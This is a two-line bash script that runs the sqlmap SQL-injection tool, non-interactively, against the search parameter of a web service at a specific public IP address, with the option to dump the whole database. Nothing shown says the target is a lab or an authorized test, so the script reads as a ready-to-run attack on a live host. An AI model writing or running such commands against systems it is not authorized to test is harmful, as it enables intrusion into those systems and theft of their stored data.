#!/bin/bash

python3 sqlmap.py -u "http://3.144.240.191:5000/search?name=test" --batch --dump
